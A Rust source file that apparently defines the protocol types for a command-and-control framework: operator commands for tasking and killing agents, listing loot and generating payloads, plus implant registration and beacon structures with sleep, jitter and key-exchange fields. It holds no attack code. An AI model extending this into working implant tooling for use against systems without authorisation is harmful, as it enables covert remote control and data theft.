use crate::types::*;
pub use crate::types::AgentResult;
use serde::{Deserialize, Serialize};
use uuid::Uuid;

// ── Operator ↔ Server (WebSocket) ─────────────────────────────────────────────

/// Messages sent from TUI operator to server.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum OpMessage {
    Auth        { token: String },
    ListAgents,
    ListListeners,
    ListLoot,
    CreateListener  { config: ListenerConfig },
    StopListener    { id: Uuid },
    TaskAgent       { agent_id: Uuid, task: AgentTask },
    KillAgent       { agent_id: Uuid },
    GeneratePayload { options: BuildOptions },
    Subscribe       { agent_id: Uuid },
    Unsubscribe     { agent_id: Uuid },
}

/// Messages sent from server to TUI operator.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum SrvMessage {
    Welcome     { version: String },
    AuthOk,
    AuthFail    { reason: String },
    Agents      { list: Vec<AgentInfo> },
    Listeners   { list: Vec<ListenerInfo> },
    Loot        { entries: Vec<LootEntry> },
    AgentNew    { agent: AgentInfo },
    AgentUpdate { agent: AgentInfo },
    AgentDead   { agent_id: Uuid },
    TaskResult  { result: AgentResult },
    BuildStart  { build_id: String },
    BuildDone   { build_id: String, path: String, size: u64 },
    BuildFail   { build_id: String, error: String },
    Log         { level: String, message: String },
    Error       { message: String },
}

// ── Agent ↔ Server (HTTP/TCP) ─────────────────────────────────────────────────

/// First beacon — agent registration payload.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentRegister {
    pub agent_id:       Uuid,
    pub listener_id:    Uuid,
    pub build_id:       String,
    pub hostname:       String,
    pub username:       String,
    pub domain:         Option<String>,
    pub ip:             String,
    pub os:             String,
    pub arch:           String,
    pub pid:            u32,
    pub privilege:      Privilege,
    pub sleep_ms:       u64,
    pub jitter_pct:     u8,
    /// x25519 ephemeral public key for ECDH key exchange (hex-encoded)
    pub ephemeral_pub:  String,
}

/// Regular beacon body (every sleep interval).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentBeacon {
    pub agent_id:   Uuid,
    pub results:    Vec<AgentResult>,
}

/// Server's response to a beacon — zero or more new tasks.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconResponse {
    pub tasks:       Vec<AgentTask>,
    pub kill:        bool,
    pub new_sleep:   Option<u64>,
}

// ── TCP framing ───────────────────────────────────────────────────────────────

/// 4-byte big-endian length-prefix + JSON body.
pub const TCP_MAX_MSG: usize = 64 * 1024 * 1024; // 64 MiB
